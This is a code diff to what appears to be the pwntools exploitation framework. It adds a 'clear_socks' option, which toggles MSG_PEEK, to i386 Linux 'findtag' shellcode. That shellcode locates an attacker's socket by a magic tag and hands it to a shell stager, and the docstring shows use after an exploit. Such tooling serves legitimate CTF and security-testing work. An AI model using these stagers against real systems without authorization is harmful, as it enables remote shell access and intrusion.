@@ -2,7 +2,7 @@ from pwn.shellcode_helper import *
 from .. import dupsh
 
 @shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
-def findtagsh(tag):
+def findtagsh(tag, clear_socks = True):
     """Args: Tag to look for
 
     Finds the current file descriptor using the findtag
@@ -18,18 +18,20 @@ def findtagsh(tag):
     return findtag(tag), dupsh("ebp")
 
 @shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
-def findtag(tag):
+def findtag(tag, clear_socks = True):
     """Args: tag to look for
     Tries to recv up to 127 bytes (nonblocking) from every file descriptor
     in the range [0, 65535] until one is found that outputs the magic tag as
     the first 4 bytes. If none is found, it continues to try, until it works.
     When one is found, it is left in ebp.
     
-    A side effect if this is that it can be used to remove garbage from a socket,
-    and will still work as long as the magic tag is "in there somewhere" and
-    as long as the magic tag becomes the first 4 bytes of the output from recv.
+    An optional side effect of this is that it can be used to remove garbage
+    from a socket, and will still work as long as the magic tag is "in there
+    somewhere" and as long as the magic tag becomes the first 4 bytes of the
+    output from recv. If you do not want this feature (perhaps because of
+    poison sockets) then set clear_socks = False.
 
-    Thus a possible way to use it is something like:
+    If the feature is enabled, then a possible way to use it is something like:
 
     sock.do_exploit()
     sock.send(findtag(TAG) + foo_shellcode('ebp') + GARBAGE)
@@ -49,7 +51,7 @@ findtag:
 
     push SYS_socketcall
     push ecx                 ; placeholder for now
-    push MSG_DONTWAIT
+    push MSG_DONTWAIT | %s
     push 0x7f
     push esp                 ; placeholder for now
     push 1
@@ -68,4 +70,4 @@ findtag:
     cmp edi, 0x%08x
     push edi
     jne .loop
-""" % int(tag)
+""" % ("0" if clear_socks else "MSG_PEEK", int(tag))
